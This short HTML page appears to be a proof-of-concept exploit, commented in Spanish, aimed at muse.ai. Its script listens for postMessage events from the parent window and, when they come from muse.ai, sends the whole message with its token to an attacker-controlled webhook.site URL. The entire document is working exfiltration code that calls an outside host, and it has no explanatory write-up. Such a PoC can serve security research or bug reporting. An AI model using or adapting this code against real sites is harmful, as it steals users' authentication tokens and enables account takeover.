<!DOCTYPE html>
<html>
<body>
    <h2>Interceptando Token...</h2>
    <script>
        const webhookUrl = "https://webhook.site/e223390b-32c0-4bfa-ab49-15cc45e09f7a";

        // 1. Escuchamos CUALQUIER mensaje que venga del padre
        window.addEventListener("message", (event) => {
            // 2. Solo nos interesan los mensajes de muse.ai (o de cualquiera, si el atacante es listo)
            if (event.origin === "https://muse.ai") {
                const data = JSON.stringify(event.data);
                
                // 3. Enviamos el mensaje (y el token) al webhook del atacante
                fetch(`${webhookUrl}?bridge_token_leak=true`, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: data
                });
            }
        });
    </script>
</body>
</html>
